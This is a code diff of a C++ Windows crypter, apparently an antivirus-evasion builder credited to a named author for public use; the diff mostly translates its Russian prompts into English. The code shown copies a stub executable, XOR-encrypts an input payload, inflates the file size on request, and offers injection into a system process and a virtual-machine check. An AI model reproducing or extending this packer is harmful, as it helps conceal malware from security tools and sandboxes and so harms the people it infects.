@@ -26,15 +26,13 @@ int main()
 	setlocale(LC_ALL, "Russian");
 	string input_file, output_file;
 
-	cout << "Привет: \n"; 
-	cout << "Hello: \n"; Sleep(2000); system("cls"); Sleep(1000);
 	cout << "Эта программа была создана @atyonekilla для публичного использования: \n";	
 	cout << "This program was create public using, please don`t delete author @atyonekilla: \n";	
 	Sleep(4000); system("cls");	Sleep(1000);
 	//Main Functions
-	cout << "Введите имя входного файла: ";
+	cout << "Enter the name of the input file: / Введите имя входного файла: ";
 	cin >> input_file;
-	cout << endl << "Введите имя выходного файла: ";
+	cout << endl << "Enter the name of the output file: / Введите имя выходного файла: ";
 	cin >> output_file;
 
 	CopyFile("Stub.exe", output_file.c_str(), FALSE);
@@ -50,12 +48,12 @@ int main()
 
 	if (file_size != bytes)
 	{
-		MessageBox(0, "Проблемы с файлом!", "", 0);
+		MessageBox(0, "Problems with the file! / Проблемы с файлом!", "", 0);
 		return 0;
 	}
 
 	int pump_factor;
-	cout << "Накинуть вес (ввести 0 - если нет): ";
+	cout << "Add weight (enter 0 if not): / Накинуть вес (ввести 0 - если нет): ";
 	cin >> pump_factor;
 
 	for (int i = 0; i < pump_factor * 1000; ++i)
@@ -64,7 +62,7 @@ int main()
 	XORCrypt(key, file_bytes);
 
 	int bInject, bCheckVm;
-	cout << "Нужен ли инжект в системный процесс: ";
+	cout << "Do I need an injection into the system process?: / Нужен ли инжект в системный процесс: ";
 	cin >> bInject;
 
 	if (bInject == 1)
@@ -72,7 +70,7 @@ int main()
 	else
 		settings.push_back('0');
 	
-	cout << endl << "Нужна ли проверка на виртуальную машину: ";
+	cout << endl << "Do I need to check for a VM: / Нужна ли проверка на виртуальную машину: ";
 	cin >> bCheckVm;
 
 	if (bCheckVm == 1)
